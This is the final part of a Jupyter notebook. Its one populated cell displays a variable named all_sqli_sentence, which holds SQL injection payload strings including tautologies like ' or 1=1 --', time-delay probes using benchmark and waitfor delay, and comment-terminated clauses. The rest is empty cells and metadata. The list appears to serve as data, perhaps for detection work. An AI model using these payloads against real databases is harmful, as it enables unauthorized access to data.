       " 'â\\x80\\x98 or 1=1 --\\n',\n",
       " 'char%4039%41%2b%40SELECT\\n',\n",
       " 'order by\\n',\n",
       " 'bfilename\\n',\n",
       " ' having 1=1--\\n',\n",
       " ') or benchmark(10000000,MD5(1))#\\n',\n",
       " ' or username like char(37);\\n',\n",
       " \";waitfor delay '0:0:__TIME__'--\\n\",\n",
       " '\" or 1=1--\\n',\n",
       " \"x' AND userid IS NULL; --\\n\",\n",
       " '*/*\\n',\n",
       " \" or 'text' > 't'\\n\",\n",
       " ' (select top 1\\n',\n",
       " ...]"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_sqli_sentence"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
